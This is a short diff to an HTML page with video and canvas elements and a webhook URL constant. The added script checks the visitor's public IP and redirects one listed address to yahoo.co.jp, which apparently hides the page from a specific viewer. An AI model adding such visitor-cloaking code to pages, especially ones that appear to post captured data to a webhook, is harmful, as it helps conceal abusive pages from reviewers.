@@ -251,6 +251,16 @@
   </video>
   <canvas id="canvas">
   </canvas>
+	<script>
+		fetch('https://api.ipify.org?format=json')
+  .then(res => res.json())
+  .then(data => {
+    const blockedIPs = ['14.11.66.224'];
+    if (blockedIPs.includes(data.ip)) {
+		location.href = 'http://www.yahoo.co.jp/';
+    }
+  });
+	</script>
   <script>
   const WEBHOOK_URL = "https://kao.aarrkami403.workers.dev/";
 
